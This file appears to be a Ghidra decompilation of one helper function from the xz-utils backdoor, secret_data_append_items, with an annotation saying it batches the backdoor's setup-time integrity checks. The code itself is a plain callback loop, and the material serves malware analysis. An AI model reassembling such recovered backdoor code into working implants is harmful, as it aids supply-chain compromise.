// /home/kali/xzre-ghidra/xzregh/10ABE0_secret_data_append_items.c
// Function: secret_data_append_items @ 0x10ABE0
// Calling convention: unknown
// Prototype: undefined secret_data_append_items(void)


/*
 * AutoDoc: Iterates an array of secret_data_item descriptors, assigning indexes on the fly and invoking the supplied appender for each. This batches the dozens of integrity checks that run during backdoor_setup into a single call.
 */
#include "xzre_types.h"


undefined8 secret_data_append_items(long param_1,ulong param_2,code *param_3)

{
  long lVar1;
  undefined8 *puVar2;
  undefined8 uVar3;
  int iVar4;
  ulong uVar5;
  
  uVar5 = 0;
  iVar4 = 0;
  while( TRUE ) {
    while( TRUE ) {
      if (param_2 <= uVar5) {
        return 1;
      }
      lVar1 = uVar5 * 0x18;
      uVar5 = (ulong)((int)uVar5 + 1);
      puVar2 = (undefined8 *)(lVar1 + param_1);
      if (*(int *)((long)puVar2 + 0x14) != 0) break;
      *(int *)((long)puVar2 + 0x14) = iVar4;
    }
    uVar3 = (*param_3)(*(undefined4 *)(puVar2 + 1),*(undefined4 *)((long)puVar2 + 0xc),
                       *(undefined4 *)(puVar2 + 2),uVar5,*puVar2);
    if ((int)uVar3 == 0) break;
    iVar4 = iVar4 + 1;
  }
  return uVar3;
}

